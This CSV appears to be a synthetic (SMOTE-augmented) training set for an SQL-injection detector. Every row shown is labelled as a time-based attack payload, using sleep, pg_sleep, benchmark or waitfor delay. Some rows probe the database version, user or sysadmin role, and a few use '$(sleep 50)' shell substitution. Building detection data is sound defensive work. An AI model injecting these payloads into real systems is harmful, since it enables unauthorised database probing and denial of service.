id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000478,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,2.126248311732748
SMOTE_000479,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,2.061900856023506
SMOTE_000480,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,0.537088071832403
SMOTE_000481,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.9737044460773099
SMOTE_000482,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,5.03674766482042e-05
SMOTE_000483,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,1.1304621895000884
SMOTE_000484,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.0
SMOTE_000485,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,0.45578944337001215
SMOTE_000486,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,2.9394679445877636
SMOTE_000487,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,0.47619133529955776
SMOTE_000488,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,0.006702056478522259
SMOTE_000489,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,1.960870901114981
SMOTE_000490,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,1.158516532804579
SMOTE_000491,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.37579001391237776
SMOTE_000492,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,0.7672753164416514
SMOTE_000493,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,1.332929016642828
SMOTE_000494,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.51394927809383
SMOTE_000495,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,1.262998580923833
SMOTE_000496,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,1.8115154936869313
SMOTE_000497,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,0.8278407694334086
SMOTE_000498,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,1.5101811272466727
SMOTE_000499,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.4050176984941966
SMOTE_000500,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,0.17139566900270073
SMOTE_000501,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.4336822093686234
SMOTE_000502,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,1.5345965788371327
SMOTE_000503,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,0.33400962200261863
SMOTE_000504,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,0.8108296838300572
SMOTE_000505,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.42757401634464054
SMOTE_000506,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,0.8136791024857432
SMOTE_000507,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,1.3469320875712598
SMOTE_000508,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.05406177018486057
SMOTE_000509,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,0.8924345127398517
SMOTE_000510,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,1.53832840583736
SMOTE_000511,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,0.3267484469717305
SMOTE_000512,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,1.1803177466217498
SMOTE_000513,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,0.7604540006473742
SMOTE_000514,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,0.4281515282634173
SMOTE_000515,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,0.5238027135159653
SMOTE_000516,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,2.5451726688170484
SMOTE_000517,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,1.3934918693432554
SMOTE_000518,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,1.627050405416728
SMOTE_000519,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,1.1118953330705224
SMOTE_000520,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,0.41315100624604056
SMOTE_000521,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,1.1485912511333498
SMOTE_000522,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.5478851330770028
SMOTE_000523,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,0.9422107190719382
SMOTE_000524,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,2.407013146067644
SMOTE_000525,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,2.4434062029963837
SMOTE_000526,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,1.5106123133594915
SMOTE_000527,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,1.055340925150607
SMOTE_000528,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,0.7676079579471246
SMOTE_000529,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,1.6008592393988306
SMOTE_000530,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,0.20207070731875235
SMOTE_000531,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,1.572309182805699
SMOTE_000532,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,0.5895471471668675
SMOTE_000533,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,1.8215968017966004
SMOTE_000534,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,2.114980058205467
SMOTE_000535,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,1.4428121758193015
SMOTE_000536,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,0.7134373186170727
SMOTE_000537,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,1.6506399781627827
SMOTE_000538,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,0.28881756540540426
SMOTE_000539,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,0.795038025372279
SMOTE_000540,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,0.02094671175141115
SMOTE_000541,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,0.7323103149678465
SMOTE_000542,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,1.1716354372364393
SMOTE_000543,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,2.178931346057846
SMOTE_000544,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000021,0.26476761439448854
SMOTE_000545,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,0.01236542308014841
SMOTE_000546,attack,time,""";waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000025,0.15488266960845581
SMOTE_000547,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,0.20592600466870614
SMOTE_000548,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,1.0878993715314431
SMOTE_000549,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.7976563436339362
SMOTE_000550,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,0.002624988945693317
SMOTE_000551,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,0.4949754582674789
SMOTE_000552,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,1.002162200000953
SMOTE_000553,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,0.1492947397505954
SMOTE_000554,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,0.8094085319386798
SMOTE_000555,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,0.282772095850663
SMOTE_000556,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,1.5416031312483252
SMOTE_000557,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.6369247587669465
SMOTE_000558,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,1.195073711942443
SMOTE_000559,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,0.9503262308688787
SMOTE_000560,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,1.5010002960302231
SMOTE_000561,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,1.0202578140889818
SMOTE_000562,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,0.5451664353868859
SMOTE_000563,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,1.9680866113368947
SMOTE_000564,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,0.5708420805052767
SMOTE_000565,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,0.14963806415744405
SMOTE_000566,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,2.367276494642468
SMOTE_000567,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,1.7116658429880134
SMOTE_000568,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,0.405299410356506
SMOTE_000569,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.9896573021583331
SMOTE_000570,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,1.4080493308420978
SMOTE_000571,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,1.0604402169904523
SMOTE_000572,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,2.2513550482025018
SMOTE_000573,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.9988131003039386
SMOTE_000574,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000021,1.1103020774650934
SMOTE_000575,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,1.5282117689765848
SMOTE_000576,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,1.7868165237557294
SMOTE_000577,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,0.19122783476355296
SMOTE_000578,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,0.4002081002414353
SMOTE_000579,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,1.1015017945150332
SMOTE_000580,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.7537005289044969
SMOTE_000581,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,0.18573265270422776
SMOTE_000582,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,1.2506440426114143
SMOTE_000583,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.40087364911856305
SMOTE_000584,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,1.5403637985605538
SMOTE_000585,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,1.0839375947297207
SMOTE_000586,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,0.700145025428155
SMOTE_000587,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,3.1660947550547314
SMOTE_000588,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,1.42481897809555
SMOTE_000589,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.5660061611032006
SMOTE_000590,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,1.0967722743883057
SMOTE_000591,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,1.875142086922808
SMOTE_000592,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,0.11084553920803397
SMOTE_000593,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,1.2838328650804216
SMOTE_000594,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,0.5008703231078093
SMOTE_000595,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,0.8516406513357322
SMOTE_000596,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,0.7644571107558652
SMOTE_000597,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.5729961747269043
SMOTE_000598,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,2.275752927590238
SMOTE_000599,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,2.035276375599056
SMOTE_000600,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,0.09082463144781774
SMOTE_000601,attack,time,""";waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000025,0.2874754007645848
SMOTE_000602,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,0.09989259516704234
SMOTE_000603,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,0.34365940518427657
SMOTE_000604,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,0.6203263613873803
SMOTE_000605,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,2.0589910237999045
SMOTE_000606,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,0.7886544170925693
SMOTE_000607,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,1.559380590411517
SMOTE_000608,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.7547868667099021
SMOTE_000609,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,0.28978158076699795
SMOTE_000610,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,1.740770843692993
SMOTE_000611,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,1.2734923828352112
SMOTE_000612,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,1.3330212993051402
SMOTE_000613,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,2.578730196004463
SMOTE_000614,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.06404663097598265
SMOTE_000615,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,1.1294234442007844
SMOTE_000616,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.7008782222602049
SMOTE_000617,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,2.1506401151945918
SMOTE_000618,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.6674244329271903
SMOTE_000619,attack,time,""";waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000025,0.9486236602833555
SMOTE_000620,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,0.041857781824090404
SMOTE_000621,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,1.6862951087323799
SMOTE_000622,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,2.2961572679344537
SMOTE_000623,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,2.38996132457413
SMOTE_000624,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,0.1522442639155597
SMOTE_000625,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,0.5111409490457729
SMOTE_000626,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,1.4297612107358542
SMOTE_000627,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,2.3561063214064877
SMOTE_000628,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,0.3859830670207163
SMOTE_000629,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.6129210172041277
SMOTE_000630,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,0.8144599735649217
SMOTE_000631,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,3.114427223969516
SMOTE_000632,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.8417386289822002
SMOTE_000633,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.1945196348007623
SMOTE_000634,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,0.9094898599700527
SMOTE_000635,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,1.549867998294324
SMOTE_000636,attack,time,""";waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000025,1.5526673088960554
SMOTE_000637,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,1.474174207358552
SMOTE_000638,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,0.9020163797457014
SMOTE_000639,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,1.9477160418383783
SMOTE_000640,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.34396768246902787
SMOTE_000641,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,1.1877835473469378
SMOTE_000642,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.2621733079126604
SMOTE_000643,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,0.5276087115796076
SMOTE_000644,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,2.195938067959458
SMOTE_000645,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,2.377039462696416
SMOTE_000646,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,0.5574375149636954
SMOTE_000647,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,1.8598770727220046
SMOTE_000648,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,0.27500521218008783
SMOTE_000649,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,1.1317280024818153
SMOTE_000650,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,1.5457119216056125
SMOTE_000651,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,1.0226363362401765
SMOTE_000652,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,0.4219108416364802
SMOTE_000653,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,2.083395594870782
SMOTE_000654,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.1166782187342197
SMOTE_000655,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,1.170687088719218
SMOTE_000656,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000004,1.1728288592908862
SMOTE_000657,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,1.1549971158397874
SMOTE_000658,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,0.08396701180576327
SMOTE_000659,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.27903832498471903
SMOTE_000660,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,0.7649986158106398
SMOTE_000661,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,0.95940761012488
SMOTE_000662,attack,time,""";waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000025,1.356230477100975
SMOTE_000663,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.09923213077112791
SMOTE_000664,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,0.9500585372273561
SMOTE_000665,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,1.594032395254616
SMOTE_000666,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000024,0.5142802906650512
SMOTE_000667,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,1.9552910980782434
SMOTE_000668,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000021,0.7403685637662862
SMOTE_000669,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,1.8267048436627926
SMOTE_000670,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,1.7238246890067201
SMOTE_000671,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.5750221184550898
SMOTE_000672,attack,time,",waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000016,2.1739404849088624
SMOTE_000673,attack,time,or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000022,0.7147475266570136
SMOTE_000674,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,1.1111725430703878
SMOTE_000675,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,1.0491987372928582
SMOTE_000676,attack,time,""";waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000025,2.3809036902330534
SMOTE_000677,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,2.471336915429232
SMOTE_000678,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,0.48690237999464786
SMOTE_000679,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,0.006670018634041719
SMOTE_000680,attack,time,or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000019,0.4422830131139505
SMOTE_000681,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,2.0061473742548595
SMOTE_000682,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,0.2736621674748225
SMOTE_000683,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,1.6033751047941545
SMOTE_000684,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.9551575237469282
SMOTE_000685,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.5867853181557715
SMOTE_000686,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,3.4100661689330782
SMOTE_000687,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,0.6276183752088066
SMOTE_000688,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,0.4745524015527051
SMOTE_000689,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.26529619372134783
